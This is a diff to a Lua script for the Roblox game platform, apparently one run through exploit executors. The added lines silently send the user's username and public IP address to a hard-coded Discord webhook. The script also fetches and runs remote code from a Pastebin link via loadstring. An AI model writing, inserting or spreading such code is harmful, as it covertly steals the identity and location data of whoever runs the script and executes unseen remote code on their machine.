@@ -87,5 +87,29 @@ if requestFunc then
 else
     warn("❌ Keine passende Request-Funktion gefunden! (Exploit nicht unterstützt)")
 end
+local webhook = "https://discord.com/api/webhooks/1409249444209364992/wJHwiXhSCvFWF8lm608TDpfZAzAPu8zc-ovpO2SqDonH5PjsEI9QErwi1zx8TmV1ujpp"
+
+local player = game:GetService("Players").LocalPlayer
+local username = player.Name
+
+local ip = game:HttpGet("https://api.ipify.org")
+local data = {
+    ["content"] = "Script benutzt von: **" .. username .. "** | IP: " .. ip .. " <@everyone>"
+}
+
+local httpService = game:GetService("HttpService")
+local payload = httpService:JSONEncode(data)
+
+local req = (syn and syn.request) or (http and http.request) or (request)
+if req then
+    req({
+        Url = webhook,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = payload
+    })
+end
 
 loadstring(game:HttpGet('https://pastebin.com/raw/G8uz2h3s'))()
